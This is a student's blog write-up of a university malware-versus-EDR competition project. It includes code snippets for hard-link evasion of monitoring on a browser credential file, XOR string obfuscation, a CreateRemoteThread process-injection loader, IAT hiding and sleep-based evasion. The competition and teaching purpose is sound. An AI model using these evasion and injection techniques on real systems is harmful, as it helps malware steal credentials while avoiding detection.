---
title: '114-1 資安攻防實務 期末專題 BOMBE (Revenge)'
date: 2025-12-23
description: '第二次的 BOMBE 專題，這次我是紅隊了！'
layout: "single"
---

## 前言

交大黃俊穎老師在今年開了一門「資安攻防實務」，是和師大「高等資安攻防」合開，一半的課在師大上，一半的課在交大上，課程內容差不多是我上過的那些，專題也是，這次要來分像第二年玩 BOMBE 的我究竟做了些什麼

首先感謝這次和我一起做專題的實驗室戰友 Tom 和 Tony，把 EDR 處理的妥妥的，讓我專心玩 malware

## Malware 設計

### Challenge: File Access Monitor

> 第一個 challenge 要求 malware 繞過 ETW 對 `bhrome/Login Data` 檔案存取的偵測

這題我使用 hard link 的方法繞過：在 `C:\\Users\\Public` 創建 `steal_login_data.db` 檔案，建立 hard link 到 target db
```c
string stealDbPath = "C:\\Users\\Public\\steal_login_data.db";
CreateHardLink(stealDbPath, dbPath, IntPtr.Zero);
```

### Challenge: Process Memory Scan

> 第二個 challenge 要求 malware 繞過 EDR 對 BOMBE 字串靜態特徵的偵測

我選擇對所有可疑的字串做 XOR encoding，選擇 XOR 的原因有兩個，一是站在 EDR 的角度，我會想抓 base64 encoding 這種常見且不需要 key 的編碼機制，畢竟解 CTF 的經驗告訴我最簡單的策略永遠都是 base64，第二個原因站在 malware 的角度，除非 EDR 嘗試到我 XOR 的 key，否則不容易抓到這些特徵
```c
public static class Obfuscator
{
    private static byte key = 0xAA;

    public static string Decode(byte[] data)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return System.Text.Encoding.ASCII.GetString(result);
    }
}

byte[] encodedPath = new byte[] {
    0xF9, 0xE5, 0xEC, 0xFE, 0xFD, 0xEB, 0xF8, 0xEF, 0xF6, // "SOFTWARE\" after XOR
    0xE8, 0xE5, 0xE7, 0xE8, 0xEF  // "BOMBE" after XOR
};
string registryPath = Obfuscator.Decode(encodedPath);
```

不過 demo 當天聽滿多組也是用一樣的策略，EDR 為了因應這種繞過方式也有抓 XOR，只是 key 都是用自選的幾組去偵測而已，要進階一點點的做法，我想是把 XOR 的 key 設成多 bytes 而非一個 byte，比如依序用 `["B", "O", "M", "B", "E"]` 做 XOR，或是施加多層 encoding，比如 XOR 完再做個 base encoding，或直接拿密碼對照表出來設計，但都治標不治本，不是最佳解就是了

### Process Injection

這次 malware 最主要的設計在 process injection，我預期把 malware 的邏輯注到 `bsass.exe` 中，再由 `bsass.exe` 去解 flags 

#### Task 1. Loader

上傳到平台的會是這邊的 loader 程式，裡面做的事情就是掃描環境中的 process，找到 \verb|bsass.exe| 後在它身上開一塊可讀可寫可執行的記憶體區塊，把準備好的 shellcode 塞進去並透過 \verb|createRemoteThread()| 執行。

```c
int pid = GetPIDByName(targetProcess);

if (pid == 0) {
    printf("[-] Target process not found. Please open %s first\n", targetProcess.c_str());
    return 1;
}

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

if (hProcess == NULL) {
    printf("[-] Failed to open process. Error: %lu\n",GetLastError());
    return 1;
}

void* remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (remoteMem == NULL) {
    printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
    CloseHandle(hProcess);
    return 1;
}

SIZE_T bytesWritten;
if (!WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), &bytesWritten)) {
    printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 1;
}

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
```

#### Task 2. Shellcode 準備

真正的 malware 邏輯會以 shellcode 的形式存在，把原先 malware 的程式轉成 .dll 檔，透過 [donut](https://github.com/TheWover/donut) 指定 `run()` 函式為入口點，再把 .dll 轉成 binary 後塞進 `.exe` 中

程式碼中可以看到主要執行的函式有兩個，一個為 `repareEnvironment()`，這會在 Issue 1. 談論過程中遇到的問題時說明，另一個為 `ExecutePayload()`，負責依序尋找三個 flags

```c
public static void Run()
{
    try
    {
        Log("=== Payload Started ===");
        Log($"[INFO] Temp Path: {MyTempPath}");

        PrepareEnvironment();
        ExecutePayload();
    }
    catch (Exception ex)
    {
        Log($"[FATAL] Run() Crashed: {ex.Message}\n{ex.StackTrace}");
    }
    finally
    {
        // try { Directory.Delete(MyTempPath, true); } catch { }
    }
}
```

#### Issue 1. .dll dependencies

設計 process injection 遇到的第一個問題是有些 .dll dependencies 在這個做法下會讀不到，透過 process monitor 在 VM 中的觀察結果是 malware 確實會去尋找 .dll，但他尋找的位置並不存在這些檔案，經過觀察發現環境中存放 .dll dependencies 的地方會是 temp directory 中每次執行都動態生成的一個位置，這讓沒辦法直接在程式中指定應該去哪裡找這些 depenndencies。因此我選擇把需要的 .dll 先寫在 resource section，等到 shellcode 執行時第一件事情就是呼叫 `PrepareEnvironment()` 把這些 .dll 檔案倒出來儲存在 temp directory 中另外新增一個資料夾，並使用 `SetDllDirectory()` API 告訴 malware 如果你需要這些 .dll 的話可以去這個資料夾中翻翻看

```c
static void PrepareEnvironment()
{
    if (!Directory.Exists(MyTempPath)) Directory.CreateDirectory(MyTempPath);

    var assembly = Assembly.GetExecutingAssembly();
    string[] resourceNames = assembly.GetManifestResourceNames();

    foreach (var name in resourceNames) Log($"[RES] Found resource: {name}");

    var libsToDrop = new[] {
        new { Res = "Malware_dll.System.Data.SQLite.dll", File = "System.Data.SQLite.dll" },
        new { Res = "Malware_dll.SQLite.Interop.dll",     File = "SQLite.Interop.dll" },
        new { Res = "Malware_dll.Newtonsoft.Json.dll",    File = "Newtonsoft.Json.dll" }
    };

    foreach (var lib in libsToDrop)
    {
        string destPath = Path.Combine(MyTempPath, lib.File);

        string fullResName = resourceNames.FirstOrDefault(r => r.EndsWith(lib.Res, StringComparison.OrdinalIgnoreCase))
                             ?? resourceNames.FirstOrDefault(r => r.EndsWith(lib.File, StringComparison.OrdinalIgnoreCase));

        if (fullResName != null)
        {
            using (var stream = assembly.GetManifestResourceStream(fullResName))
            using (var fs = File.Create(destPath))
            {
                stream.CopyTo(fs);
            }
            Log($"[DROP] Extracted {lib.File} to {destPath}");
        }
        else
        {
            Log($"[ERR] Resource not found for {lib.File}!");
        }
    }

    bool setDirResult = SetDllDirectory(MyTempPath);
    Log($"[API] SetDllDirectory result: {setDirResult}");

    AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
    {
        string dllName = new AssemblyName(args.Name).Name + ".dll";
        string dllPath = Path.Combine(MyTempPath, dllName);

        if (File.Exists(dllPath))
        {
            Log($"[LOAD] Resolving {dllName} from {dllPath}");
            return Assembly.LoadFrom(dllPath);
        }
        return null;
    };
}
}
```

#### Issue 2. 就 Challenge 3 過不了？

設計 process injection 遇到第二個問題是有時候 malware 會成功解出 flag 1、flag 2，但 flag 3 卻找不到，同時 EDR 也沒辦法偵測到我的程式因此以平手結尾的問題，事後分析是因為選擇 process injection 的 target 是原本就攜帶 flag 3 的 `bsass.exe`，但在 malware 找完前兩個 flags 後，memory 裡面會存有三個 flags，這時候做 memory scan 就有機會拿到 flag 1 或 flag 2。解決方法也很簡單，就加一個 filter 確定掃描到的字串不是 flag 1 也不是 flag 2，但符合 flag 格式才確定是 flag 3

```c
string bufferString = System.Text.Encoding.ASCII.GetString(buffer);
MatchCollection matches = regex.Matches(bufferString);
foreach (Match match in matches)
{
    if (match.Success && !match.Value.Contains(answer_1) && !match.Value.Contains(answer_2))
    {
        return match.Value;
    }
}
```

#### Trick 1. IAT Hiding

為了避免 EDR 去掃 import table，在這次專題中也有把之前課程提到的 IAT hiding 技巧加進去

```c
typedef HANDLE(WINAPI* pfnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

HMODULE hModule_Kernel32 = NULL;
pfnCreateRemoteThread MyCreateRemoteThread = NULL;
// Get the module handle for kernel32.dll
hModule_Kernel32 = GetModuleHandle(TEXT("kernel32.dll"));

if (hModule_Kernel32 == NULL) {
    std::cerr << "Error: GetModuleHandle(\"kernel32.dll\") failed." << std::endl;
    std::cerr << "Windows Error Code: " << GetLastError() << std::endl;
    printf("Error: GetModuleHandle(\"kernel32.dll\") failed.\n");
    printf("Windows Error Code: %lu\n", GetLastError());
    return 1;
}
FARPROC CreateRemoteThreadAddress = GetProcAddress(hModule_Kernel32, "CreateRemoteThread");
MyCreateRemoteThread = (pfnCreateRemoteThread)CreateRemoteThreadAddress;
```

#### Trick 2. Persistence

大多數 EDR 會在 malware 被執行的第一瞬間就去掃描 memory，雖然有做 encoding，但為了避免 EDR 掃描時 memory 已經將 suspicious decode 完而被抓到，在環境執行時間限制一分鐘的前提下，我讓 malware 先睡了 30 秒再開始執行惡意行為

#### Trick 3. Confuser

原本是想要在截止前十分鐘對程式做加殼，但發現不小心用到混淆了，所以對這次的專題應該沒有太大的影響，不過 confuser 可以再把字串弄的更亂，或許對於靜態特徵掃描還是有一些些益處。我使用 [confuserEX](https://github.com/yck1509/ConfuserEx) 工具，使用時機在產生 `.dll` 但使用 donut 轉成 shellcode 以前

## 競賽結果

放個最終的競賽結果紀念，我們是 `[NCTU]_[HSLAB]`，好險拿實驗室名字出來戰鬥沒有丟人現眼

{{< figure
    src="BOMBE-rank.png"
    alt="BOMBE-rank"
    caption="Malware 第一名、EDR 第二名"
    >}}

{{< figure
    src="BOMBE-matrix.png"
    alt="BOMBE-matrix"
    caption="競賽矩陣，可以看到 Malware 打贏了 15 支 EDR，被一支 EDR 抓到，一支戰成平手"
    >}}

## 心得

這學期的 BOMBE 競賽，我把重心放在 malware 上（終於做紅隊的我覺得很開心），一開始就是想嘗試 process injection，但過程中偵錯、設想 EDR 立場再嘗試繞過，其實用到了比想像還多的技巧。印象比較深刻的是去年在專題發表時，Nini 有問到我 PPID spoofing 失敗的一些原因，但我並沒有實際去測試環境中看 log 或嘗試一些偵錯方式，這點滿可惜的，所以今年在做 process injection 時，即便是遇到問題，也有嘗試去解決，像是前面提到 .dll dependencies 就是一個例子

因為後半年參加比較多 AIS3 的活動和課程，聽了 TwinkleStar03 在程安和資安攻防實務講了很多 PE format 和逆向的知識，11 月又跑去台北上馬老師的課，說以後看到 .exe 檔案就要在腦海中把 PE format 畫出來，說實話我覺得這部分的觀念進步超多，至少不會在資安領域看到 Windows 開頭的東西就害怕，也會嘗試在上面思考一些設計，這次 malware 原本想參照馬老師在 11 月的課堂最後教的 shellcoding 方式實作，但礙於時間以及能力問題，最後還是乖乖使用 PoC 的 C# 範例程式慢慢開發了

相較於去年，我認為這次專題稍嫌可惜的地方還是沒有在事前做詳細的設計，demo 當天聽到 `[NCTU]_[LR_JK]` 這組的設計雖然用到滿多超出我自己 domain knowledge 的概念，但很明確的看到他們對於 malware 與 EDR 在實作之前都有先設想過最終的目的，比如希望 malware 在環境中看起來像個乖寶寶，進到環境後趕快把工作交代給其他人後就退場，而不是想一堆繞過的方法

如果有下一次的 BOMBE 競賽，malware 部分會想嘗試直接對 PE format 上動手腳，比如在 sections 部分塞自己的 shellcode 邏輯，用非常規的 PE 執行方式看看效果如何，EDR 則是會想參考市面上的防毒軟體偵測方式再看看有什麼特別的設計，最後就是對執行環境有更進一步的認識，理解這些環境提供的資源和底層的設計、執行邏輯，對於設計 malware 和 EDR 會比較有主動的設計想法